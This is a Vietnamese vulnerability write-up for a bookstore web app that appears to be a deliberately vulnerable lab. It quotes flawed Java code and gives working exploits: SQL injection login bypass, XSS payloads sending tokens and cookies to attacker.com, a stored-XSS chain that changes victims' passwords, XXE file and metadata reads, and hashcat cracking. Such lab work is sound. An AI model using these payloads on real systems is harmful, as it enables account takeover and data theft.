# Tổng Hợp Tất Cả Lỗ Hổng Bảo Mật — JVA Bookstore

## Mục lục

| # | Lỗ hổng | Loại | Mức độ |
|---|---------|------|--------|
| 1 | [SQLi — Tìm kiếm sách](#1-sql-injection--tìm-kiếm-sách) | SQL Injection | Cao |
| 2 | [SQLi — Quick Search](#2-sql-injection--quick-search) | SQL Injection | Cao |
| 3 | [SQLi — Đăng nhập (Authentication Bypass)](#3-sql-injection--đăng-nhập-authentication-bypass) | SQL Injection | Nghiêm trọng |
| 4 | [SQLi — Kiểm tra email (Data Leak)](#4-sql-injection--kiểm-tra-email-data-leak) | SQL Injection | Cao |
| 5 | [SQLi — Đổi mật khẩu (Bypass currentPassword)](#5-sql-injection--đổi-mật-khẩu-bypass-currentpassword) | SQL Injection | Nghiêm trọng |
| 6 | [Stored XSS — Đánh giá sách](#6-stored-xss--đánh-giá-sách) | XSS | Nghiêm trọng |
| 7 | [Reflected XSS — Trang tìm kiếm](#7-reflected-xss--trang-tìm-kiếm) | XSS | Trung bình |
| 8 | [CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản](#8-csrf--kết-hợp-stored-xss--sqli-chiếm-tài-khoản) | CSRF | Nghiêm trọng |
| 9 | [XXE — Import sách bằng XML](#9-xxe--import-sách-bằng-xml) | XXE | Nghiêm trọng |
| 10 | [IDOR — Xem profile user bất kỳ](#10-idor--xem-profile-user-bất-kỳ) | Broken Access Control | Cao |
| 11 | [Sensitive Data Exposure — Lộ password hash toàn bộ user](#11-sensitive-data-exposure--lộ-password-hash-toàn-bộ-user) | Sensitive Data Exposure | Nghiêm trọng |
| 12 | [Security Misconfiguration — Stack trace + Error message leak](#12-security-misconfiguration--stack-trace--error-message-leak) | Security Misconfiguration | Cao |

---

## 1. SQL Injection — Tìm kiếm sách

### Thông tin lỗ hổng

- **Loại:** SQL Injection
- **File:** `src/main/java/dao/BookDAO.java` — dòng 120-122
- **Endpoint:** `GET /api/books/search?q=<payload>`

### Code lỗi

```java
String sql = "SELECT b.id, b.title, b.author, b.isbn, b.price, b.description, " +
        "b.category, b.stock_quantity, b.image_url, b.created_at, b.updated_at, " +
        "b.status, b.shop_id, b.shop_name, 0 AS total_sold, 0 AS average_rating, " +
        "0 AS rating_count, 0 AS favorite_count " +
        "FROM books b WHERE 1=1 AND (b.title = '" + keyword.trim() + "' " +
        "OR b.author = '" + keyword.trim() + "' " +
        "OR b.isbn = '" + keyword.trim() + "')";
```

**Nguyên nhân:** Dùng string concatenation (`+`) để ghép trực tiếp input người dùng (`keyword`) vào câu SQL, thay vì dùng `PreparedStatement` với tham số `?`.

### Cách tấn công chi tiết

**Bước 1:** Mở trình duyệt, truy cập trang chủ `https://localhost:8443`

**Bước 2:** Vào ô tìm kiếm sách trên giao diện

**Bước 3:** Nhập payload vào ô tìm kiếm:

```
' OR '1'='1' --
```

**Bước 4:** Nhấn Enter hoặc nút tìm kiếm

**Kết quả:** Trả về **toàn bộ sách** trong database thay vì chỉ sách khớp từ khóa.

**Giải thích:** Câu SQL sau khi ghép payload trở thành:
```sql
SELECT ... FROM books b WHERE 1=1
AND (b.title = '' OR '1'='1' --' OR b.author = '...')
```
- `' OR '1'='1'` → điều kiện luôn đúng → trả về tất cả
- `--` → comment phần SQL còn lại

### Payload nâng cao — UNION SELECT lấy thông tin user

```
' UNION SELECT 1, username, email, password_hash, 0, '', '', 0, '', now(), now(), 'active', 0, '', 0, 0, 0, 0 FROM users --
```

**Kết quả:** Trả về danh sách "sách" nhưng thực chất là thông tin user (username, email, password hash).

---

## 2. SQL Injection — Quick Search

### Thông tin lỗ hổng

- **Loại:** SQL Injection
- **File:** `src/main/java/dao/BookDAO.java` — dòng 139-142
- **Endpoint:** `GET /api/books/search?q=<payload>` (quick search)

### Code lỗi

```java
String keyword_trimmed = keyword.trim();
String sql = BASE_SELECT +
        " WHERE b.status = 'active' AND (b.title ILIKE '%" + keyword_trimmed +
        "%' OR b.author ILIKE '%" + keyword_trimmed +
        "%' OR b.isbn ILIKE '%" + keyword_trimmed + "%') " +
        "ORDER BY rating_count DESC, total_sold DESC, b.title ASC LIMIT " + limit;
```

**Nguyên nhân:** Tương tự lỗ hổng #1 — string concatenation. Thêm vào đó, biến `limit` cũng bị ghép trực tiếp.

### Cách tấn công chi tiết

**Bước 1:** Mở trình duyệt, truy cập trang chủ

**Bước 2:** Gõ vào thanh tìm kiếm nhanh (autocomplete):

```
') OR ('1'='1
```

**Bước 3:** Quan sát dropdown kết quả

**Kết quả:** Hiển thị toàn bộ sách đang active.

**Giải thích:** Câu SQL sau khi ghép:
```sql
... WHERE b.status = 'active' AND (b.title ILIKE '%') OR ('1'='1%' ...)
```
Điều kiện `OR ('1'='1...')` luôn đúng.

---

## 3. SQL Injection — Đăng nhập (Authentication Bypass)

### Thông tin lỗ hổng

- **Loại:** SQL Injection + Authentication Bypass
- **File:** `src/main/java/web/AuthServlet.java` — dòng 114
- **Endpoint:** `POST /api/login`

### Code lỗi

```java
// Dòng 114: String concatenation
String sql = "SELECT id, username, email, password_hash, role, status " +
             "FROM users WHERE username = '" + username + "'";

// Dòng 148-155: Nếu password_hash rỗng → bỏ qua kiểm tra BCrypt
if (dbHash != null && !dbHash.trim().isEmpty()) {
    if (!BCrypt.checkpw(password, dbHash)) {
        // Từ chối
    }
}
```

**Nguyên nhân:**
1. `username` ghép trực tiếp vào SQL → attacker chèn UNION SELECT
2. Nếu `password_hash` trả về rỗng (`''`) → code bỏ qua bước kiểm tra mật khẩu

### Cách tấn công chi tiết

**Bước 1:** Mở trình duyệt, truy cập `https://localhost:8443/login.jsp`

**Bước 2:** Tại ô "Tên đăng nhập" (username), nhập payload:

```
' UNION SELECT 1, 'admin', 'admin@test.com', '', 'admin', 'active' --
```

**Bước 3:** Tại ô "Mật khẩu" (password), nhập bất kỳ, ví dụ: `abc`

**Bước 4:** Nhấn nút "Đăng nhập"

**Kết quả:** Đăng nhập thành công với **quyền admin**, được redirect đến `/admin-dashboard`.

**Giải thích từng bước:**

1. Câu SQL gốc: `SELECT ... FROM users WHERE username = '<input>'`
2. Sau khi ghép payload:
```sql
SELECT id, username, email, password_hash, role, status
FROM users WHERE username = ''
UNION SELECT 1, 'admin', 'admin@test.com', '', 'admin', 'active' --'
```
3. Query gốc trả về 0 row (không có user tên `''`)
4. UNION SELECT trả về 1 row giả:
   - `id = 1`
   - `username = 'admin'`
   - `email = 'admin@test.com'`
   - `password_hash = ''` (rỗng!)
   - `role = 'admin'`
   - `status = 'active'`
5. Code kiểm tra: `dbHash = ''` → `dbHash.trim().isEmpty() = true` → **bỏ qua kiểm tra mật khẩu**
6. Login thành công với role `admin`

### Mở rộng — Login với role khác

Thay `'admin'` bằng `'seller'` để login quyền seller:
```
' UNION SELECT 1, 'seller', 'seller@test.com', '', 'seller', 'active' --
```

---

## 4. SQL Injection — Kiểm tra email (Data Leak)

### Thông tin lỗ hổng

- **Loại:** SQL Injection + Information Disclosure
- **File:** `src/main/java/web/AuthServlet.java` — dòng 56
- **Endpoint:** `GET /api/login?email=<payload>`

### Code lỗi

```java
String sql = "SELECT id, email, full_name, role, status " +
             "FROM users WHERE email = '" + email.trim() + "'";
```

**Nguyên nhân:** Parameter `email` ghép trực tiếp vào SQL.

### Cách tấn công chi tiết

**Bước 1:** Mở trình duyệt hoặc dùng DevTools Console (F12)

**Bước 2:** Gọi API:

```javascript
// Cách 1: Gõ trực tiếp trên thanh URL
// https://localhost:8443/api/login?email=' OR '1'='1' --

// Cách 2: Dùng fetch trong Console
fetch("/api/login?email=' OR '1'='1' --")
  .then(r => r.json())
  .then(data => console.log(data));
```

**Kết quả:** Server trả về thông tin user đầu tiên trong bảng:
```json
{
  "exists": true,
  "email": "admin@bookstore.vn",
  "name": "Admin User",
  "role": "admin"
}
```

**Bước 3 — Liệt kê tất cả user:** Dùng UNION SELECT với OFFSET:

```
/api/login?email=' UNION SELECT 1, email, full_name, role, status FROM users LIMIT 1 OFFSET 0 --
```

Thay `OFFSET 0` thành `OFFSET 1`, `OFFSET 2`, ... để lấy từng user.

**Bước 4:** Attacker thu thập được danh sách:
- Email tất cả user
- Họ tên
- Role (admin, seller, customer)
- Trạng thái tài khoản

→ Dùng thông tin này để tấn công tiếp (brute force password, phishing có chủ đích).

---

## 5. SQL Injection — Đổi mật khẩu (Bypass currentPassword)

### Thông tin lỗ hổng

- **Loại:** SQL Injection + Authentication Bypass
- **File:** `src/main/java/web/ProfileServlet.java` — dòng 600-608
- **Endpoint:** `POST /api/profile/password` hoặc `PUT /api/profile/password`

### Code lỗi

```java
// Dòng 586-598: Kiểm tra BCrypt trước (cho user bình thường)
boolean passwordVerified = false;
String selectSql = "SELECT password_hash FROM users WHERE email = ?";
// ... BCrypt.checkpw(currentPassword, storedHash) ...

// Dòng 600-608: Fallback — legacy SQL query (LỖ HỔNG!)
if (!passwordVerified) {
    String legacySql = "SELECT id FROM users WHERE email = '" + email
                     + "' AND password_hash = '" + currentPassword + "'";
    try (java.sql.Statement stmt = conn.createStatement();
         ResultSet rs = stmt.executeQuery(legacySql)) {
        if (rs.next()) {
            passwordVerified = true;
        }
    }
}
```

**Nguyên nhân:**
1. Kiểm tra mật khẩu bằng BCrypt trước → nếu fail (vì payload SQLi không phải mật khẩu thật)
2. Fallback sang legacy SQL dùng string concatenation → `currentPassword` ghép trực tiếp vào SQL
3. Attacker chèn `' OR '1'='1'--` vào `currentPassword` → điều kiện luôn đúng → bypass

**Lưu ý quan trọng:** User bình thường nhập đúng mật khẩu cũ → BCrypt verify thành công ở bước 1 → đổi mật khẩu bình thường, KHÔNG chạy vào legacy SQL.

### Cách tấn công chi tiết

**Bước 1:** Đăng nhập vào tài khoản (bất kỳ tài khoản nào)

**Bước 2:** Vào trang "Đổi mật khẩu" trên giao diện

**Bước 3:** Điền form:
- **Mật khẩu hiện tại:** `' OR '1'='1'--`
- **Mật khẩu mới:** `hacked123`
- **Xác nhận mật khẩu:** `hacked123`

**Bước 4:** Nhấn "Đổi mật khẩu"

**Kết quả:** Mật khẩu được đổi thành `hacked123` mà **không cần biết mật khẩu cũ**.

**Giải thích:** Câu legacy SQL sau khi ghép:
```sql
SELECT id FROM users WHERE email = 'victim@email.com' AND password_hash = '' OR '1'='1'--'
```
- `password_hash = ''` → false
- `OR '1'='1'` → true
- `--` → comment phần còn lại
- **Kết quả: trả về row** → `passwordVerified = true` → cho phép đổi mật khẩu

### Hoặc dùng API trực tiếp (DevTools Console)

```javascript
fetch('/api/profile/password', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
    },
    body: JSON.stringify({
        currentPassword: "' OR '1'='1'--",
        newPassword: 'hacked123',
        confirmPassword: 'hacked123'
    })
}).then(r => r.json()).then(console.log);
```

---

## 6. Stored XSS — Đánh giá sách

### Thông tin lỗ hổng

- **Loại:** Stored XSS (Cross-Site Scripting)
- **File:** `src/main/webapp/book-detail.jsp` — dòng 265
- **Trang bị ảnh hưởng:** Trang chi tiết sách (`/book-detail.jsp?id=<bookId>`)

### Code lỗi

```jsp
<p class="text-gray-700 leading-relaxed whitespace-pre-line break-words">
    ${r.comment}    <%-- EL expression KHÔNG escape HTML! --%>
</p>
```

**Nguyên nhân:**
- Dùng `${r.comment}` (EL expression) để render nội dung đánh giá
- EL expression **không tự động escape HTML** → thẻ HTML/JavaScript trong comment được render trực tiếp
- Đáng lẽ phải dùng `<c:out value="${r.comment}"/>` (tự escape `<`, `>`, `"`, `&`)
- Backend (`ReviewDAO.upsertReview()`) lưu content trực tiếp vào database mà không sanitize

### Điều kiện tiên quyết

- Attacker phải có tài khoản trên hệ thống
- Attacker phải đã mua ít nhất 1 cuốn sách (để có quyền viết đánh giá)

### Cách tấn công chi tiết

**Bước 1:** Đăng nhập bằng tài khoản attacker

**Bước 2:** Mua 1 cuốn sách bất kỳ (ví dụ sách có id=1), hoàn tất đơn hàng

**Bước 3:** Vào trang chi tiết cuốn sách vừa mua: `https://localhost:8443/book-detail.jsp?id=1`

**Bước 4:** Kéo xuống phần "Viết đánh giá", chọn số sao và nhập nội dung:

```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="alert('XSS - Cookie: ' + document.cookie)">
```

> Phần text đầu cần dài hơn 50 ký tự để pass validation.

**Bước 5:** Nhấn "Gửi đánh giá" → Review được lưu vào database

**Bước 6:** Bất kỳ user nào (kể cả admin) vào xem trang chi tiết cuốn sách đó:
- Trang load danh sách đánh giá → `${r.comment}` render trực tiếp HTML
- Thẻ `<img src=x>` được render → trình duyệt load ảnh → lỗi (vì `src=x` không tồn tại) → sự kiện `onerror` kích hoạt
- **JavaScript chạy:** `alert('XSS - Cookie: ' + document.cookie)`
- Popup hiện ra → chứng minh XSS thành công

### Payload thực tế — Đánh cắp token

Thay vì `alert()`, attacker dùng payload thực tế:

```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="new Image().src='https://attacker.com/steal?token='+localStorage.getItem('auth_token')+'&cookie='+document.cookie">
```

→ Token JWT và cookie nạn nhân bị gửi về server attacker.

---

## 7. Reflected XSS — Trang tìm kiếm

### Thông tin lỗ hổng

- **Loại:** Reflected XSS
- **File:** `src/main/java/web/BooksApiServlet.java` — dòng 166-167
- **Endpoint:** `GET /api/books/search-result?q=<payload>`

### Code lỗi

```java
writer.println("<h2>Kết quả tìm kiếm cho: " + keyword + "</h2>");
writer.println("<p>Bạn đã tìm kiếm: <strong>" + keyword + "</strong></p>");
```

**Nguyên nhân:** Biến `keyword` từ parameter `q` được ghi thẳng vào HTML response mà không escape.

### Cách tấn công chi tiết

**Bước 1:** Attacker tạo link chứa payload:

```
https://localhost:8443/api/books/search-result?q=<img src=x onerror="alert(document.cookie)">
```

**Bước 2:** Gửi link này cho nạn nhân qua email, chat, mạng xã hội, v.v.

Ví dụ: "Em ơi, sách này đang giảm giá nè: [link]"

**Bước 3:** Nạn nhân click link

**Kết quả:** Trình duyệt nạn nhân nhận HTML response:
```html
<h2>Kết quả tìm kiếm cho: <img src=x onerror="alert(document.cookie)"></h2>
```
→ JavaScript chạy trên trình duyệt nạn nhân

### Payload nâng cao — Redirect đến trang phishing

```
https://localhost:8443/api/books/search-result?q=<script>window.location='https://attacker.com/phishing?cookie='+document.cookie</script>
```

→ Nạn nhân bị redirect sang trang giả mạo, cookie bị đánh cắp.

---

## 8. CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản

### Thông tin lỗ hổng

- **Loại:** CSRF (Cross-Site Request Forgery), kết hợp Stored XSS + SQLi
- **File:** Kết hợp lỗ hổng #5 (SQLi đổi mật khẩu) + #6 (Stored XSS)
- **Endpoint bị tấn công:** `POST /api/profile/password`

### Nguyên nhân

1. Server không kiểm tra CSRF token trên endpoint đổi mật khẩu
2. Cookie `auth_token` được set với `SameSite=None` → trình duyệt gửi cookie trong cross-origin request
3. Stored XSS cho phép chạy JavaScript từ cùng origin → bypass mọi hạn chế CORS/SameSite
4. SQLi trong `currentPassword` cho phép bypass kiểm tra mật khẩu cũ

### Cách tấn công chi tiết

#### Giai đoạn 1: Attacker chuẩn bị (cài bẫy)

**Bước 1:** Attacker đăng nhập bằng tài khoản của mình

**Bước 2:** Mua 1 cuốn sách bất kỳ (để có quyền viết đánh giá)

**Bước 3:** Vào trang chi tiết sách đã mua, viết đánh giá với nội dung:

```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="var t=localStorage.getItem('auth_token');if(t){fetch('/api/profile/password',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+t},body:JSON.stringify({currentPassword:&quot;' OR '1'='1'--&quot;,newPassword:'hacked_csrf',confirmPassword:'hacked_csrf'})})}">
```

**Bước 4:** Nhấn "Gửi đánh giá" → Payload XSS được lưu vào database

#### Giai đoạn 2: Nạn nhân bị tấn công (tự động)

**Bước 5:** Nạn nhân (bất kỳ user đang đăng nhập) truy cập trang chi tiết cuốn sách có review độc hại

**Bước 6:** Trang load đánh giá → `${r.comment}` render thẻ `<img>` → `onerror` kích hoạt → JavaScript chạy tự động:

1. `localStorage.getItem('auth_token')` → lấy JWT token nạn nhân
2. `fetch('/api/profile/password', ...)` → gửi request đổi mật khẩu:
   - `currentPassword: "' OR '1'='1'--"` → SQLi bypass (lỗ hổng #5)
   - `newPassword: 'hacked_csrf'`
   - `confirmPassword: 'hacked_csrf'`
3. Server nhận request → BCrypt check fail → fallback legacy SQL → SQLi bypass → **mật khẩu nạn nhân bị đổi thành `hacked_csrf`**

**Bước 7:** Nạn nhân **không hay biết** — trang hiển thị bình thường, không popup, không redirect

#### Giai đoạn 3: Attacker chiếm tài khoản

**Bước 8:** Attacker login bằng email nạn nhân + mật khẩu `hacked_csrf`

**Bước 9:** Toàn quyền truy cập tài khoản nạn nhân: xem đơn hàng, đổi thông tin, mua hàng, v.v.

### Kiểm tra tấn công thành công

1. Mở DevTools (F12) → tab **Network**
2. Truy cập trang sách có review độc hại
3. Quan sát: thấy request `POST /api/profile/password` tự động gửi
4. Response: `{"success":true,"message":"Password changed successfully"}`
5. Logout → login lại bằng mật khẩu cũ → **Thất bại**
6. Login bằng `hacked_csrf` → **Thành công**

---

## 9. XXE — Import sách bằng XML

### Thông tin lỗ hổng

- **Loại:** XXE (XML External Entity Injection)
- **File:** `src/main/java/web/BooksApiServlet.java` — dòng 295-308
- **Endpoint:** `POST /api/books/import` (Content-Type: application/xml)

### Code lỗi

```java
private void handleXmlImport(HttpServletRequest req, HttpServletResponse resp)
        throws IOException {
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // KHÔNG disable external entities!
        // Thiếu: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(req.getInputStream());
        // ...
    }
}
```

**Nguyên nhân:** `DocumentBuilderFactory` mặc định cho phép External Entity — attacker khai báo entity trỏ đến file hệ thống hoặc URL nội bộ.

### Cách tấn công chi tiết

#### Tấn công 1 — Đọc file hệ thống

**Bước 1:** Mở terminal hoặc Postman

**Bước 2:** Gửi request sau (dùng curl):

**Trên Windows (đọc file win.ini):**
```bash
curl -k -X POST https://localhost:8443/api/books/import \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE books [
  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">
]>
<books>
  <book>
    <title>&xxe;</title>
    <author>test</author>
  </book>
</books>"
```

**Trên Linux (đọc /etc/passwd):**
```bash
curl -k -X POST https://localhost:8443/api/books/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE books [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<books>
  <book>
    <title>&xxe;</title>
    <author>test</author>
  </book>
</books>'
```

**Kết quả:** Nội dung file `win.ini` hoặc `/etc/passwd` được đọc và xử lý bởi server. Nếu response chứa thông tin book title → nội dung file bị lộ trực tiếp.

**Giải thích:**
1. `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` → khai báo entity `xxe` trỏ đến file
2. `<title>&xxe;</title>` → khi parser xử lý `&xxe;`, nó đọc nội dung file và thay thế vào
3. Server xử lý title = nội dung file → trả về trong response

#### Tấn công 2 — SSRF (Server-Side Request Forgery)

```bash
curl -k -X POST https://localhost:8443/api/books/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE books [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<books>
  <book>
    <title>&xxe;</title>
    <author>test</author>
  </book>
</books>'
```

**Kết quả:** Server gửi request đến `169.254.169.254` (AWS metadata endpoint) → lộ credentials cloud instance.

#### Tấn công 3 — Đọc source code ứng dụng

```xml
<!DOCTYPE books [
  <!ENTITY xxe SYSTEM "file:///path/to/application/WEB-INF/web.xml">
]>
```

→ Đọc được cấu hình web.xml, biết cấu trúc ứng dụng.

#### Hoặc dùng JavaScript trong DevTools Console

```javascript
fetch('/api/books/import', {
    method: 'POST',
    headers: {'Content-Type': 'application/xml'},
    body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE books [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<books>
  <book>
    <title>&xxe;</title>
    <author>test</author>
  </book>
</books>`
}).then(r => r.json()).then(console.log);
```

---

## 10. IDOR — Xem profile user bất kỳ

### Thông tin lỗ hổng

- **Loại:** IDOR (Insecure Direct Object Reference) — Broken Access Control
- **File:** `src/main/java/web/ProfileServlet.java` — dòng 312-365
- **Endpoint:** `GET /api/profile/user-info?userId=<id>`

### Code lỗi

```java
private void getAnyUserProfile(HttpServletRequest request, HttpServletResponse response)
        throws IOException {
    // KHÔNG kiểm tra quyền! Bất kỳ user đăng nhập nào cũng gọi được
    String userIdParam = request.getParameter("userId");
    long userId = Long.parseLong(userIdParam);

    String sql = "SELECT id, email, full_name, phone, birth_date, address, " +
                 "role, status, created_at FROM users WHERE id = ?";
    // Trả về toàn bộ thông tin user
}
```

**Nguyên nhân:** Endpoint nhận `userId` từ client mà **không kiểm tra** user hiện tại có quyền xem profile của user đó không.

### Cách tấn công chi tiết

**Bước 1:** Đăng nhập bằng tài khoản customer bình thường

**Bước 2:** Mở DevTools (F12) → Console

**Bước 3:** Chạy lệnh lấy thông tin user id=1:

```javascript
fetch('/api/profile/user-info?userId=1', {
    headers: {
        'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
    }
}).then(r => r.json()).then(data => console.log(data));
```

**Kết quả:**
```json
{
  "success": true,
  "user": {
    "id": 1,
    "email": "admin@bookstore.vn",
    "fullName": "Admin User",
    "phone": "0901234567",
    "address": "123 Nguyễn Huệ, Q1, TP.HCM",
    "role": "admin",
    "status": "active",
    "createdAt": "2024-01-01T00:00:00"
  }
}
```

**Bước 4:** Lặp lại với `userId=2`, `userId=3`, ... để thu thập thông tin **tất cả user**:

```javascript
// Quét 100 user đầu tiên
for (let i = 1; i <= 100; i++) {
    fetch('/api/profile/user-info?userId=' + i, {
        headers: {'Authorization': 'Bearer ' + localStorage.getItem('auth_token')}
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            console.log(`User ${i}: ${data.user.email} - ${data.user.fullName} - ${data.user.role}`);
        }
    });
}
```

**Thông tin bị lộ:** Email, SĐT, địa chỉ nhà, ngày sinh, role (admin/seller/customer), trạng thái tài khoản.

---

## 11. Sensitive Data Exposure — Lộ password hash toàn bộ user

### Thông tin lỗ hổng

- **Loại:** Sensitive Data Exposure
- **File:** `src/main/java/web/ProfileServlet.java` — dòng 377-417
- **Endpoint:** `GET /api/profile/export`

### Code lỗi

```java
private void exportAllUsersData(HttpServletRequest request, HttpServletResponse response)
        throws IOException {
    // KHÔNG kiểm tra quyền admin!
    String sql = "SELECT id, email, full_name, phone, birth_date, address, " +
                 "role, status, password_hash, created_at FROM users ORDER BY id";
    // ...
    user.put("passwordHash", rs.getString("password_hash")); // Trả về BCrypt hash!
}
```

**Nguyên nhân:**
1. Endpoint không yêu cầu quyền admin — bất kỳ user đăng nhập nào cũng truy cập được
2. Trả về cả trường `password_hash` — hash BCrypt của tất cả user

### Cách tấn công chi tiết

**Bước 1:** Đăng nhập bằng bất kỳ tài khoản nào (kể cả customer)

**Bước 2:** Mở DevTools (F12) → Console

**Bước 3:** Chạy:

```javascript
fetch('/api/profile/export', {
    headers: {
        'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
    }
}).then(r => r.json()).then(data => {
    console.log("Tổng số user:", data.total);
    data.users.forEach(u => {
        console.log(`${u.email} | ${u.role} | ${u.passwordHash}`);
    });
});
```

**Kết quả:**
```
Tổng số user: 50
admin@bookstore.vn | admin | $2a$10$xKj5Ld9f8Gh...
seller1@gmail.com | seller | $2a$10$mNp3Qr7t2Wx...
customer1@gmail.com | customer | $2a$10$aB4cD5eF6g...
...
```

**Bước 4 — Crack password bằng hashcat:**

```bash
# Lưu hash vào file
echo '$2a$10$xKj5Ld9f8Gh...' > hashes.txt
echo '$2a$10$mNp3Qr7t2Wx...' >> hashes.txt

# Crack bằng hashcat (BCrypt mode = 3200)
hashcat -m 3200 hashes.txt wordlist.txt
```

**Bước 5:** Password yếu (123456, password123, qwerty, ...) bị crack trong vài phút đến vài giờ.

**Bước 6:** Attacker login vào tài khoản admin/seller/bất kỳ ai có password yếu.

### Hoặc gõ trực tiếp trên URL

```
https://localhost:8443/api/profile/export
```

(Nếu đang đăng nhập và cookie `auth_token` có sẵn → trả về JSON chứa toàn bộ data)

---

## 12. Security Misconfiguration — Stack Trace + Error Message Leak

### Thông tin lỗ hổng

- **Loại:** Security Misconfiguration
- **File 1:** `src/main/webapp/error.jsp` — dòng 15-21
- **File 2:** `src/main/java/web/AuthServlet.java` — dòng 65, 93, 216

### Code lỗi

**error.jsp (stack trace leak):**
```jsp
<p>Message: <%= exception != null ? exception.getMessage() :
    request.getAttribute("javax.servlet.error.message") %></p>
<pre>
<%
    if (exception != null) {
        exception.printStackTrace(new java.io.PrintWriter(out));
    }
%>
</pre>
```

**AuthServlet.java (error message leak):**
```java
// Dòng 65:
out.write("{\"error\":\"" + e.getMessage() + "\"}");

// Dòng 93:
out.write("{\"error\":\"" + e.getMessage() + "\"}");

// Dòng 216:
out.write("{\"error\":\"Login error: " + e.getMessage() + "\"}");
```

**Nguyên nhân:**
1. `error.jsp` in toàn bộ Java stack trace ra trình duyệt
2. AuthServlet trả về `e.getMessage()` — chứa chi tiết lỗi SQL, tên bảng, cấu trúc query

### Cách tấn công chi tiết

#### Tấn công 1 — Khai thác Error Message Leak

**Bước 1:** Mở DevTools (F12) → Console

**Bước 2:** Gửi request gây lỗi SQL:

```javascript
fetch("/api/login?email='")
  .then(r => r.json())
  .then(data => console.log(data));
```

**Kết quả:** Server trả về chi tiết lỗi PostgreSQL:
```json
{
  "error": "ERROR: unterminated quoted string at or near \"'\" Position: 58"
}
```

**Bước 3:** Thử tiếp để xác định số cột:

```javascript
// Thử UNION SELECT với số cột khác nhau
fetch("/api/login?email=' UNION SELECT 1--")
  .then(r => r.json()).then(console.log);
// → Lỗi: "each UNION query must have the same number of result columns"

fetch("/api/login?email=' UNION SELECT 1,2,3,4,5--")
  .then(r => r.json()).then(console.log);
// → Thành công → biết bảng có 5 cột: id, email, full_name, role, status
```

**Thông tin attacker thu được:**
- Database type: PostgreSQL
- Tên bảng: `users`
- Số cột và tên cột
- Cấu trúc SQL query gốc
- Phiên bản database

→ Attacker dùng thông tin này để craft payload SQLi chính xác (lỗ hổng #1-#5).

#### Tấn công 2 — Khai thác Stack Trace Leak

**Bước 1:** Gây lỗi server nghiêm trọng (ví dụ gửi request đến endpoint bị lỗi)

**Bước 2:** Server redirect đến `error.jsp`

**Kết quả:** Trang hiển thị full Java stack trace:
```
java.sql.SQLException: ERROR: relation "users" does not exist
    at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(...)
    at web.AuthServlet.handleLogin(AuthServlet.java:123)
    at web.AuthServlet.doPost(AuthServlet.java:78)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:681)
    ...
```

**Thông tin attacker thu được:**
- Package structure: `web.AuthServlet`, `dao.BookDAO`
- Java version
- Database driver: `org.postgresql`
- File path trên server
- Tên method và dòng code

---

## Tóm tắt toàn bộ

| # | Lỗ hổng | Loại | Endpoint | Payload chính |
|---|---------|------|----------|---------------|
| 1 | SQLi tìm sách | SQLi | `GET /api/books/search?q=` | `' OR '1'='1' --` |
| 2 | SQLi quick search | SQLi | `GET /api/books/search?q=` | `') OR ('1'='1` |
| 3 | SQLi login bypass | SQLi | `POST /api/login` | `' UNION SELECT 1,'admin','a@b.c','','admin','active' --` |
| 4 | SQLi data leak | SQLi | `GET /api/login?email=` | `' OR '1'='1' --` |
| 5 | SQLi đổi pass | SQLi | `POST /api/profile/password` | currentPassword: `' OR '1'='1'--` |
| 6 | Stored XSS | XSS | Review sách | `<img src=x onerror="...">` |
| 7 | Reflected XSS | XSS | `GET /api/books/search-result?q=` | `<img src=x onerror="alert(1)">` |
| 8 | CSRF chain | CSRF+XSS+SQLi | Review sách → `/api/profile/password` | Stored XSS auto-submit |
| 9 | XXE | XXE | `POST /api/books/import` | `<!ENTITY xxe SYSTEM "file:///...">` |
| 10 | IDOR | Broken Access | `GET /api/profile/user-info?userId=` | `userId=1,2,3...` |
| 11 | Data Exposure | Sensitive Data | `GET /api/profile/export` | Trả về password hash |
| 12 | Misconfiguration | Security Misconfig | Gây lỗi SQL | Error message + stack trace |
